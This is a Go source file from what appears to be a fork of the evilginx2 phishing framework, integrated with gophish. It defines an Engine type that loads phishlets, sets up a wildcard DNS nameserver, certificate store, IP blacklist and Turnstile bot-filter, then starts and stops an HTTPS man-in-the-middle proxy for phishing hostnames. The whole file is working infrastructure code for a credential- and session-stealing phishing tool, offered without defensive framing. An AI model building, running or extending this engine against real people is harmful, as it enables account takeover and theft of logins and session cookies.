// Package engine wires together the evilinx2 engine components so a parent
// process can start and stop the whole proxy engine programmatically. It is
// the extracted startup sequence that main.go previously performed inline;
// the interactive terminal remains available on top of an Engine.
package engine

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/caddyserver/certmagic"
	"github.com/jinzhu/gorm"
	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	log "github.com/kgretzky/evilginx2/log"
	"go.uber.org/zap"
)

// Options configures an Engine instance. Required: PhishletsDir, ConfigDir,
// GophishDB.
type Options struct {
	// PhishletsDir is the directory containing the *.yaml phishlets.
	PhishletsDir string
	// RedirectorsDir is the directory containing the HTML redirector pages.
	RedirectorsDir string
	// ConfigDir is the writable directory holding config.json, data.db and
	// the crt/ certificate store.
	ConfigDir string
	// GophishDB is the full path to the gophish SQLite database. It is
	// required unless GPDB is provided.
	GophishDB string
	// GPDB is an existing connection to the gophish database. When set, it is
	// adopted as-is and GophishDB is ignored; this is how the unified
	// evilgophish binary shares gophish's single connection with the proxy.
	GPDB *gorm.DB
	// Turnstile holds the Cloudflare turnstile "public:private" keys; when
	// empty the turnstile integration is disabled.
	Turnstile string
	// HttpsPort overrides the configured HTTPS proxy port when non-zero.
	HttpsPort int
	// DnsPort overrides the configured nameserver port when non-zero.
	DnsPort int
	// ExternalIP overrides the configured server external IP when non-empty.
	ExternalIP string
	// Developer enables developer mode (self-signed certificates for all
	// hostnames).
	Developer bool
	// PortTolerance makes the proxy accept requests whose Host header carries
	// a non-standard port in phishing hostname comparisons (local testing on a
	// port other than 443).
	PortTolerance bool
	// FeedEnabled enables the live-feed websocket notifications.
	FeedEnabled bool
}

// Engine owns one running evilinx2 engine: configuration, database,
// blacklist, nameserver, port-80 http server and the HTTPS MITM proxy.
type Engine struct {
	// Cfg is the loaded engine configuration.
	Cfg *core.Config
	// DB is the persistent session database (buntdb).
	DB *database.Database
	// Blacklist is the IP blacklist.
	Blacklist *core.Blacklist
	// Nameserver is the wildcard DNS server (nil until Start is called).
	Nameserver *core.Nameserver
	// CertDB is the TLS certificate store.
	CertDB *core.CertDb
	// HttpServer is the port-80 server (nil when turnstile is disabled).
	HttpServer *core.HttpServer
	// Proxy is the HTTPS MITM proxy (valid after Start).
	Proxy *core.HttpProxy

	options Options
	started bool
}

// New builds and loads an Engine from Options. Listeners are not started
// until Start is called.
func New(opts Options) (*Engine, error) {
	if opts.ConfigDir == "" {
		return nil, fmt.Errorf("config dir is required")
	}
	if opts.PhishletsDir == "" {
		return nil, fmt.Errorf("phishlets dir is required")
	}
	if opts.GophishDB == "" && opts.GPDB == nil {
		return nil, fmt.Errorf("gophish database path is required")
	}

	// Silence certmagic's own logger, matching the standalone binary.
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if err := os.MkdirAll(opts.ConfigDir, os.FileMode(0700)); err != nil {
		return nil, err
	}

	cfg, err := core.NewConfig(opts.ConfigDir, "")
	if err != nil {
		return nil, fmt.Errorf("config: %v", err)
	}
	cfg.SetRedirectorsDir(opts.RedirectorsDir)

	// Apply serve-side overrides before any listener snapshots the
	// configuration (the nameserver binds its address at construction).
	if opts.HttpsPort != 0 {
		cfg.SetHttpsPort(opts.HttpsPort)
	}
	if opts.DnsPort != 0 {
		cfg.SetDnsPort(opts.DnsPort)
	}
	if opts.ExternalIP != "" {
		cfg.SetServerExternalIP(opts.ExternalIP)
	}
	if opts.PortTolerance {
		cfg.SetPortTolerance(true)
	}

	db, err := database.NewDatabase(filepath.Join(opts.ConfigDir, "data.db"))
	if err != nil {
		return nil, fmt.Errorf("database: %v", err)
	}

	if opts.GPDB != nil {
		database.SetGPDB(opts.GPDB)
	} else {
		if err := database.SetupGPDB(opts.GophishDB); err != nil {
			return nil, fmt.Errorf("database: %v", err)
		}
	}

	bl, err := core.NewBlacklist(filepath.Join(opts.ConfigDir, "blacklist.txt"))
	if err != nil {
		return nil, fmt.Errorf("blacklist: %v", err)
	}

	files, err := os.ReadDir(opts.PhishletsDir)
	if err != nil {
		return nil, fmt.Errorf("failed to list phishlets directory '%s': %v", opts.PhishletsDir, err)
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(opts.PhishletsDir, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()

	ns, err := core.NewNameserver(cfg)
	if err != nil {
		return nil, fmt.Errorf("nameserver: %v", err)
	}

	crt_db, err := core.NewCertDb(filepath.Join(opts.ConfigDir, "crt"), cfg, ns)
	if err != nil {
		return nil, fmt.Errorf("certdb: %v", err)
	}

	return &Engine{
		Cfg:        cfg,
		DB:         db,
		Blacklist:  bl,
		Nameserver: ns,
		CertDB:     crt_db,
		options:    opts,
	}, nil
}

// Start launches the engine listeners in the same order as the standalone
// binary: the nameserver, the HTTPS MITM proxy and, when turnstile keys are
// configured, the port-80 HTTP server.
func (e *Engine) Start() error {
	if e.started {
		return fmt.Errorf("engine already started")
	}

	e.Cfg.RefreshActiveHostnames()

	e.Nameserver.Start()

	if e.options.Turnstile != "" {
		turnstileParts := strings.Split(e.options.Turnstile, ":")
		if len(turnstileParts) != 2 {
			return fmt.Errorf("invalid turnstile config, expected public:private key")
		}
		hs, err := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
		if err != nil {
			return fmt.Errorf("http server: %v", err)
		}
		hp, err := core.NewHttpProxy(e.Cfg.GetServerBindIP(), e.Cfg.GetHttpsPort(), e.Cfg, e.CertDB, e.DB, e.Blacklist, e.options.Developer, e.options.FeedEnabled, true)
		if err != nil {
			return fmt.Errorf("http proxy: %v", err)
		}
		hs.Start(hp)
		e.HttpServer = hs
		e.Proxy = hp
	} else {
		hp, err := core.NewHttpProxy(e.Cfg.GetServerBindIP(), e.Cfg.GetHttpsPort(), e.Cfg, e.CertDB, e.DB, e.Blacklist, e.options.Developer, e.options.FeedEnabled, false)
		if err != nil {
			return fmt.Errorf("http proxy: %v", err)
		}
		e.Proxy = hp
	}

	e.Proxy.Start()
	e.started = true
	return nil
}

// Stop gracefully shuts down the engine's listeners.
func (e *Engine) Stop() {
	ctx := context.Background()
	if e.Proxy != nil {
		e.Proxy.Shutdown()
	}
	if e.HttpServer != nil {
		e.HttpServer.Shutdown(ctx)
	}
	if e.Nameserver != nil {
		e.Nameserver.Shutdown(ctx)
	}
	e.started = false
}